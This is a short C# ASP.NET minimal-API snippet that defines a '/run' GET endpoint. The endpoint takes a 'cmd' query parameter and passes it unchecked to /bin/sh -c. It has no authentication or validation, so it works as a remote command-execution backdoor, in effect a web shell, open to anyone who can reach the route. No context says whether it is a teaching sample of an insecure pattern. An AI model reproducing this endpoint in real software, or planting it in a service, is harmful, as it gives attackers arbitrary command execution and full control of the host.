app.MapGet("/run", (string cmd) =>
{
    var p = System.Diagnostics.Process.Start("/bin/sh", $"-c {cmd}");
    return "started";
});
